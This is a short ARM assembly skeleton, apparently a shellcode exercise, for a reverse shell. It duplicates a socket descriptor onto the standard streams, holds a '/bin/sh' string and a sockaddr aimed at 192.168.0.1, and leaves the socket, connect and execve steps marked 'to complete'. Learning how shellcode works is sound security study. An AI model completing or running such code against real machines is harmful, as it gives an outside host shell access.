.global _start
_start:
 
  @@@@@@ sockfd = socket(int socket_family, int socket_type, int protocol) @@@@@@
@ to complete
 
  @ r0 contains the fd returned by the syscall
  mov r6, r0 @ file descriptor
 
  @@@@@@ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) @@@@@@
@ to complete
 
  @@@@@@ dup2 syscall
  mov r1, #2              @ counter stdin(0), stdout(1) and stderr(2)
  loop:
    mov r0, r6
    mov r7, #63           @ dup2 syscall
    swi 0
    sub r1, r1, #1        @ decrement counter
    cmp r1, #-1           @ compare r1 with -1
    bne loop              @ if the result is not equal jmp to loop
 
  @@@@@@ int execve(const char *filename, char *const argv[],char *const envp[]) @@@@@@
@ to complete
 
_exit:
  mov r0, #0
  mov r7, #1
  swi 0                   @ exit(0)

_sh: 
  .asciz "/bin/sh"

_sockaddr:
  .hword 2                @ sin_family
  .hword 0xb315           @ sin_port
  .word  0x0100a8c0       @ sin_addr
  .byte  0,0,0,0,0,0,0,0  @ sin_zero 